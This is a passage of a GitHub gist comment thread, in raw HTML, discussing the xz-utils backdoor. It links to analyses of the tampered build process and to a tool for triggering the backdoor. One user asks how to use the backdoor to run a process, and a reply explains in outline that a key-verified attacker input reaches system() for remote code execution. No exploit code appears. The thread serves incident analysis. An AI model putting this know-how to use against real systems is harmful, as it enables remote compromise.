      <p dir="auto"><del>You may be interested in <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/blasty/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/blasty">@blasty</a>'s <a href="https://GitHub.com/blasty/JiaTansSSHAgent">SSH agent</a>.</del></p>
<p dir="auto">Oops. I see it on the list now.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5042901" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="wPTNtcUZswCrrFVkPwrpNzH0VSchDMt-b60Ip1KChLDFF_KUE_9VP_lUTP-aewaDzJJieXHfKAYFFeW7bu2HCw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5042901/edit_form?textarea_id=gistcomment-5042901-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/varunsh-coder/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/varunsh-coder"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/25015917?s=80&amp;v=4" width="40" height="40" alt="@varunsh-coder" /></a>
    </div>
    <div id="gistcomment-5067225" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5067225-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/varunsh-coder/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/varunsh-coder">varunsh-coder</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5067225#gistcomment-5067225" id="gistcomment-5067225-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-05-24T03:12:49Z" class="no-wrap">May 24, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/thesamesam">@thesamesam</a> I want to share my analysis of the XZ Utils build process which was done by monitoring all file write events and process events on the build server. This makes it easier to understand</p>
<ul dir="auto">
<li>how the <code class="notranslate">Makefile</code> was tampered and the multiple <code class="notranslate">sed</code> commands and their arguments used to tamper it</li>
<li>how the <code class="notranslate">liblzma_la-crc64-fast.o</code> object file was created by uncompressing the <code class="notranslate">good-large_compressed.lzma</code> file</li>
<li>how the <code class="notranslate">liblzma_la-crc64-fast.o</code> object file was linked to overwrite the <code class="notranslate">liblzma_la-crc64_fast.o</code> file</li>
</ul>
<p dir="auto">You can refer to this blog post for more details <a href="https://www.stepsecurity.io/blog/analysis-of-backdoored-xz-utils-build-process-with-harden-runner" rel="nofollow">https://www.stepsecurity.io/blog/analysis-of-backdoored-xz-utils-build-process-with-harden-runner</a>.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5067225" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="FprmaVGr_oB5tUDuv0zNJ7Vg6w80Of9KEzrl7ToXwJcDWriqPLFcYwrTmfZ3h5cEUqoa3uLiXCP4BJTU3aL-fA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5067225/edit_form?textarea_id=gistcomment-5067225-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/felipec/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/felipec"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/8358?s=80&amp;v=4" width="40" height="40" alt="@felipec" /></a>
    </div>
    <div id="gistcomment-5071326" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5071326-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/felipec/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/felipec">felipec</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5071326#gistcomment-5071326" id="gistcomment-5071326-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-05-28T17:27:40Z" class="no-wrap">May 28, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/varunsh-coder/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/varunsh-coder">@varunsh-coder</a> the configure step doesn't use <code class="notranslate">build-to-host.m4</code>, I explained that in my blog post: <a href="https://felipec.wordpress.com/2024/04/18/simplifying-the-xz-backdoor/" rel="nofollow">Simplifying the xz backdoor</a>.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5071326" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="HZBFJ95_oEDjGi6ypvvoYI0R-GuXyVYPsWOktpiSMyRPn9FxcaEX9kSxCuitWPvymrWe5XYlPrPP0_4fkGSxUA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5071326/edit_form?textarea_id=gistcomment-5071326-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/leiless/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/leiless"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/38041294?s=80&amp;v=4" width="40" height="40" alt="@leiless" /></a>
    </div>
    <div id="gistcomment-5073408" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5073408-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/leiless/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/leiless">leiless</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5073408#gistcomment-5073408" id="gistcomment-5073408-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-05-30T08:28:06Z" class="no-wrap">May 30, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOAkR2ztoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBNagA"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">Hi, all.</p>
<p dir="auto">About the xz backdoor ssh:<br>
I have the 5.6.1 version of liblzma (in a VM), and I want to do some experiments with it.</p>
<p dir="auto">How could I use this xz backdoor to launch a malicious process (say <code class="notranslate">sleep infinity</code>)?</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5073408" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="6rkp7mqbjN_RD1D5coFL5n5cbYsklSRAvjmQUD0-QQ22TUkNwIGyQH3iyeryudzYjmfTSAoHQYF-E3Mszf4xKQ" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5073408/edit_form?textarea_id=gistcomment-5073408-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/eebssk1/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/eebssk1"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/16506472?s=80&amp;v=4" width="40" height="40" alt="@eebssk1" /></a>
    </div>
    <div id="gistcomment-5073885" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5073885-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/eebssk1/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/eebssk1">eebssk1</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5073885#gistcomment-5073885" id="gistcomment-5073885-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-05-30T18:18:23Z" class="no-wrap">May 30, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">Hi, all.</p>
<p dir="auto">About the xz backdoor ssh: I have the 5.6.1 version of liblzma (in a VM), and I want to do some experiments with it.</p>
<p dir="auto">How could I use this xz backdoor to launch a malicious process (say <code class="notranslate">sleep infinity</code>)?</p>
</blockquote>
<p dir="auto"><code class="notranslate">Filippo Valsorda has shared [analysis](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b) indicating that the attacker must supply a key which is verified by the payload and then attacker input is passed to system(), giving remote code execution (RCE).</code></p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5073885" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="HqcaNVewSYdrtWFbtjNPfUZMLMdrO7yptB4wRTbqr72jZe05nNgbszzeb-k0_NAfpKiqWFuJoHKf1Y1oXAWe1Q" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5073885/edit_form?textarea_id=gistcomment-5073885-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>


<!-- Rendered timeline since 2025-01-02 07:08:18 -->
<div id="partial-timeline-marker"
      class="js-timeline-marker js-updatable-content"
      data-last-modified="Thu, 02 Jan 2025 15:08:18 GMT"
      >
</div>

            </div>

            <div class="discussion-timeline-actions">
              <div data-view-component="true" class="flash flash-warn mt-3">
  
    <a rel="nofollow" class="btn btn-primary" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;signed out comment&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="2ab29d4d85661f5aefc48f7d7d7491fc84f0f93d3df113792b69bd3fc433dbdd" href="/join?source=comment-gist">Sign up for free</a>
    <strong>to join this conversation on GitHub</strong>.
    Already have an account?
    <a rel="nofollow" class="Link--inTextBlock" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;signed out comment&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="ea0898df3df7a3db7d70383cf7e84ae9e85786e7543c7aecfadcd121b8e936fd" data-test-selector="comments-sign-in-link" href="/login?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27">Sign in to comment</a>


  
</div>
            </div>
          </div>
        </div>
</div>
  </div>
</div><!-- /.container -->

    </main>
  </div>

  </div>

          <footer class="footer pt-8 pb-6 f6 color-fg-muted p-responsive" role="contentinfo" >
  <h2 class='sr-only'>Footer</h2>

  


  <div class="d-flex flex-justify-center flex-items-center flex-column-reverse flex-lg-row flex-wrap flex-lg-nowrap">
    <div class="d-flex flex-items-center flex-shrink-0 mx-2">
      <a aria-label="Homepage" title="GitHub" class="footer-octicon mr-2" href="https://github.com">
        <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
</a>
      <span>
        &copy; 2025 GitHub,&nbsp;Inc.
      </span>
    </div>

    <nav aria-label="Footer">
      <h3 class="sr-only" id="sr-footer-heading">Footer navigation</h3>

      <ul class="list-style-none d-flex flex-justify-center flex-wrap mb-2 mb-lg-0" aria-labelledby="sr-footer-heading">

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
          </li>

          <li class="mx-2">
